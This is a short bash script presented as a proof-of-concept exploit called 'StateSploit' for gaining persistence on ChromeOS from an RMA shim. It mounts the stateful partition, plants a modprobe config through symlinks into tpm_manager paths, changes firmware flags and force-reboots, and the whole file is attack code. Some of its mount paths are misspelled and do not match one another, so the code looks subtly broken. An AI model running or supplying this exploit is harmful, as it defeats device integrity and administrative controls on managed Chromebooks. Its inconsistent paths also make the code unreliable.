#!/bin/bash
# [THIS IS A SERIOUS EXPLOIT. IT ALLOWS FOR CHROMEOS PERSISTENCE]
# Run this on a rma shim.



#------PoC of StateSploit by writable----
mkdir -p /mnt/sp1
mount -o loop,rw /dev/mmcblk0p1 /mnt/sp1
SAVED_PWD1=$(pwd)
cd /mnt/sp1
mkdir .tpm_owned
CMD="pkill -9 frecon && /sbin/frecon --dev-mode"
echo "install uinput ${CMD}" > .tpm_owned/pwned.conf
mkdir -p unencrypted/tpm_manager
mkdir pwndir
ln -s /run/modprobe.d /mnt/stateful_partiton/pwndir/.tpm_owned
ln -s /mnt/stateful_partion/pwndir/ unencrypted/tpm_manager/tpm_owned
crossystem disable_dev_request=1
echo -e "Rebooting in 3 seconds"
sleep 3
reboot -f
